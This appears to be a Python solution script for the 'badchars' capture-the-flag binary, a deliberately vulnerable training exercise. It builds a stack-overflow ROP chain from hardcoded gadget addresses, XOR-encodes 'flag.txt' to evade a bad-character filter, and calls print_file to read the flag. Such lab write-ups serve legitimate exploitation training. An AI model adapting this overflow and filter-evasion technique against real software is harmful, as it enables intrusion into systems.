import struct
import subprocess

def inc_flag_addr(start: int, increment: int) -> bytes:
    return struct.pack('<Q', start+increment)

def main():
    elf = './badchars'

    padding = b'A'*40
    flag_strg = b'82?9p*&*' # "flag.txt" xor'd each char with "^"
    start = 0x601a00
    flag_addr = inc_flag_addr(start, 0)
    xor_val = b'^'*8 # xor ROP gadget will xor byte by byte, but just fill with all "^" for simplicity
    pop_r12_r13_r14_r15 = struct.pack('<Q', 0x0040069c) + flag_strg + flag_addr + xor_val + flag_addr
    mov_r13_r12 = struct.pack('<Q', 0x00400634)
    
    xor_chain = b''
    # xor each byte of "flag.txt" string by incrementing its address byte by byte
    for i in range(8):
        pop_r15 = struct.pack('<Q', 0x004006a2) + inc_flag_addr(start, i)
        xor_r15_r14 = struct.pack('<Q', 0x00400628)
        xor_chain += pop_r15 + xor_r15_r14
    
    pop_rdi = struct.pack('<Q', 0x004006a3) + flag_addr
    print_file = struct.pack('<Q', 0x00400620)

    payload = padding + pop_r12_r13_r14_r15 + mov_r13_r12 + xor_chain + pop_rdi + print_file

    p = subprocess.run(elf, input=payload)

if __name__=='__main__':
    main()
